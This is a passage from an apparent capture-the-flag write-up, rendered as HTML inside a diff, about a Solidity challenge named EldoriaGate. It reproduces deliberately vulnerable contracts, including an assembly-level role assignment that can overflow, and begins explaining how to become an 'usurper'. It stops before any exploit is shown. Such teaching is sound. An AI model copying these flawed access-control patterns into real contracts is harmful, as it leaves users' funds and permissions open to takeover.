+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x40</span>)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> packed <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span><span style="display:flex;"><span>            auth <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">mload</span>(<span style="color:#d699b6">0x80</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> newPacked <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">or</span>(<span style="color:#b2c98f">and</span>(packed, <span style="color:#b2c98f">not</span>(<span style="color:#d699b6">0xff</span>)), auth)
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">sstore</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>), newPacked)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">evaluateIdentity</span>(<span style="color:#dbbc7f">address</span> _unknown, <span style="color:#dbbc7f">uint8</span> _contribution) <span style="color:#e67e80">external</span> onlyFrontend <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint</span> id, <span style="color:#dbbc7f">uint8</span> roles) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">assembly</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x00</span>, _unknown)
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x40</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x00</span>, _unknown)
+</span></span><span style="display:flex;"><span>            id <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x20</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">sstore</span>(villagerSlot, id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> storedPacked <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> storedAuth <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">and</span>(storedPacked, <span style="color:#d699b6">0xff</span>)
+</span></span><span style="display:flex;"><span>            if <span style="color:#b2c98f">iszero</span>(storedAuth) { <span style="color:#b2c98f">revert</span>(<span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>) }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> defaultRolesMask <span style="color:#7a8478">:=</span> ROLE_SERF
+</span></span><span style="display:flex;"><span>            roles <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">add</span>(defaultRolesMask, _contribution)
+</span></span><span style="display:flex;"><span>            if <span style="color:#b2c98f">lt</span>(roles, defaultRolesMask) { <span style="color:#b2c98f">revert</span>(<span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>) }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> packed <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">or</span>(storedAuth, shl(<span style="color:#d699b6">8</span>, roles))
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">sstore</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>), packed)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">hasRole</span>(<span style="color:#dbbc7f">address</span> _villager, <span style="color:#dbbc7f">uint8</span> _role) <span style="color:#e67e80">external</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span> hasRoleFlag) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">assembly</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x0</span>, _villager)
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x0</span>, <span style="color:#d699b6">0x40</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> packed <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> roles <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">and</span>(shr(<span style="color:#d699b6">8</span>, packed), <span style="color:#d699b6">0xff</span>)
+</span></span><span style="display:flex;"><span>            hasRoleFlag <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">gt</span>(<span style="color:#b2c98f">and</span>(roles, _role), <span style="color:#d699b6">0</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<h2 id="code-reading">Code reading</h2>
+<p>When facing a blockchain challenge, I like to read the contracts in order to understand with is the workflow behind the challenge and what we are supposed to do. With this in mind, the setup contract help a lot with that because it directly tell the condition to solve.</p>
+<h3 id="setupsol">Setup.sol</h3>
+<p>Let&rsquo;s start with the setup. It contains two public variables: <code>player</code> (us) and <code>TARGET</code>.</p>
+<p>Reading the <code>constructor</code> which is called once only to deploy the contract, we read that two parameters need to be supplied, a <code>secret</code>  and an <code>address</code> :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">bytes4</span> _secret, <span style="color:#dbbc7f">address</span> _player) {
+</span></span><span style="display:flex;"><span>    TARGET <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> EldoriaGate(_secret);
+</span></span><span style="display:flex;"><span>    player <span style="color:#7a8478">=</span> _player;
+</span></span><span style="display:flex;"><span>    emit DeployedTarget(<span style="color:#dbbc7f">address</span>(TARGET));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It simply deploys an <code>EldoriaGate</code> contract with the submited <code>secret</code> (of type bytes4, which are just 4 bytes hex encoded) in argument and store it in <code>TARGET</code>.</p>
+<p>And finally the <code>isSolved</code> function :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> TARGET.checkUsurper(player);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This function return either True or False, so we assume it have to returns True in order to solve the challenge, so the player <strong>needs</strong> to be an Usurper.</p>
+<p>Let&rsquo;s dive in the deployed contract by the setup, the <strong>EldoriaGate</strong> contract.</p>
+<h3 id="eldoriagatesol">EldoriaGate.sol</h3>
+<h4 id="constructor">constructor</h4>
+<p>First, let&rsquo;s read the constructor. It takes one parameter and it&rsquo;s a <code>_secret</code> of types bytes4 again.
+Since this contract is deployed using the setup <code>secret</code>, they share the same secret :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">bytes4</span> _secret) {
+</span></span><span style="display:flex;"><span>    kernel <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> EldoriaGateKernel(_secret);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It deploys the Kernel with the same secret again.
+So, the same secret value is shared between the three contracts.</p>
+<h4 id="enter">enter</h4>
+<p>Next, we got the <code>enter()</code> function :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">enter()</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">enter</span>(<span style="color:#dbbc7f">bytes4</span> passphrase) <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bool</span> isAuthenticated <span style="color:#7a8478">=</span> kernel.authenticate(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, passphrase);
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(isAuthenticated, <span style="color:#b2c98f">&#34;Authentication failed&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> contribution <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>);        
+</span></span><span style="display:flex;"><span>    (<span style="color:#dbbc7f">uint</span> villagerId, <span style="color:#dbbc7f">uint8</span> assignedRolesBitMask) <span style="color:#7a8478">=</span> kernel.evaluateIdentity(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, contribution);
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">string</span>[] <span style="color:#e67e80">memory</span> roles <span style="color:#7a8478">=</span> getVillagerRoles(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    emit VillagerEntered(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, villagerId, isAuthenticated, roles);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>It takes a <code>bytes4 passphrase</code> in parameter which is, we suppose, related to the secret we have seen before.</p>
+<p>First, the kernel is called with the submitted passphrase and returns a bool identified as &ldquo;isAuthenticated&rdquo;.</p>
+<p>Without reading the kernel code we can understand that, if the submitted passphrase is equal to the secret, the return value is True :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">bool</span> isAuthenticated <span style="color:#7a8478">=</span> kernel.authenticate(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, passphrase);
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">require</span>(isAuthenticated, <span style="color:#b2c98f">&#34;Authentication failed&#34;</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Also, if the passphrase is wrong the execution is reverted, but otherwise, the execution flow continues.</p>
+<p>Then,</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> contribution <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>);        
+</span></span><span style="display:flex;"><span>(<span style="color:#dbbc7f">uint</span> villagerId, <span style="color:#dbbc7f">uint8</span> assignedRolesBitMask) <span style="color:#7a8478">=</span> kernel.evaluateIdentity(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, contribution);
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">string</span>[] <span style="color:#e67e80">memory</span> roles <span style="color:#7a8478">=</span> getVillagerRoles(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The contribution is taken from <code>msg.value</code>, and call <code>evaluateIdentity()</code> from the kernel with the contribution and msg.sender in arugment.</p>
+<p>So, without reading the code, we assume our role is set according to the contribution we give.</p>
+<p>And it retrieves the roles we have got with <code>getVillagerRoles</code> which we will read now :</p>
+<h4 id="getvillagerroles">getVillagerRoles</h4>
+<details>
+  <summary style="color: #F99417; cursor: pointer">getVillagerRoles</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">getVillagerRoles</span>(<span style="color:#dbbc7f">address</span> _villager) <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">string</span>[] <span style="color:#e67e80">memory</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">string</span>[<span style="color:#d699b6">8</span>] <span style="color:#e67e80">memory</span> roleNames <span style="color:#7a8478">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;SERF&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;PEASANT&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;ARTISAN&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;MERCHANT&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;KNIGHT&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;BARON&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;EARL&#34;</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;DUKE&#34;</span>
+</span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    (, , <span style="color:#dbbc7f">uint8</span> rolesBitMask) <span style="color:#7a8478">=</span> kernel.villagers(_villager);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> count <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">for</span> (<span style="color:#dbbc7f">uint8</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>; i <span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">8</span>; i<span style="color:#7a8478">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> ((rolesBitMask <span style="color:#7a8478">&amp;</span> (<span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> i)) <span style="color:#7a8478">!=</span> <span style="color:#d699b6">0</span>) {
+</span></span><span style="display:flex;"><span>            count<span style="color:#7a8478">++</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">string</span>[] <span style="color:#e67e80">memory</span> foundRoles <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> <span style="color:#dbbc7f">string</span>[](count);
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> index <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">for</span> (<span style="color:#dbbc7f">uint8</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>; i <span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">8</span>; i<span style="color:#7a8478">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> roleBit <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#d699b6">1</span>) <span style="color:#7a8478">&lt;&lt;</span> i; 
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (kernel.hasRole(_villager, roleBit)) {
+</span></span><span style="display:flex;"><span>            foundRoles[index] <span style="color:#7a8478">=</span> roleNames[i];
+</span></span><span style="display:flex;"><span>            index<span style="color:#7a8478">++</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> foundRoles;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>It makes a call to the kernel :</p>
+<ul>
+<li>
+<p>Retrive the <code>rolesBitMask</code> variable by calling <code>kernel.villagers(_villager)</code> to recover roles of a villager formated in a 8 bits numbre.</p>
+</li>
+<li>
+<p>Then <code>count</code> the &ldquo;1&rdquo;&rsquo;s in it.</p>
+</li>
+<li>
+<p>Then declare a string array with a length of the previous count.</p>
+</li>
+<li>
+<p>Recover each player role as string with <code>kernel.hasRole</code> and fill the string array.</p>
+</li>
+</ul>
+<h4 id="checkusurper">checkUsurper</h4>
+<p>And for the last function, also the one called to check if we have solved challenge, it&rsquo;s pretty short.</p>
